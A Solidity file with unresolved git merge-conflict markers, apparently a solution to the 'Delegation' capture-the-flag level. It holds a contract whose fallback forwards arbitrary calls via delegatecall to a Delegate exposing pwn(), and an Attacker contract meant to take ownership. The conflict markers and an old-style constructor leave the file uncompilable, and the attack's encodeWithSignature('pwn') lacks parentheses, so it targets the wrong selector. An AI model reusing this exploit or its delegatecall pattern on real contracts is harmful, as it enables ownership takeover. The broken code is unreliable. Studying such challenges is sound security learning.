<<<<<<< HEAD
pragma solidity ^0.8.0;

contract delegation {
    function delegation(){

    }
}
=======

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress)
    {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }
    // gets triggered when we call a function that does not exist
    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
    }
  }
}

contract Attacker{
    address public victim;

    constructor(address _victimcontract){
        victim = _victimcontract;
    }
    // this function wil trigger the fallback() in Delegation
    // by calling pwn() which does not exist
    // This way the contract preseves the context msg.data
    function attack() public{
        victim.call(abi.encodeWithSignature("pwn"));
    }
}
>>>>>>> 1dd6df586657b3396c5a6ef4a7d97efe48a5b01b
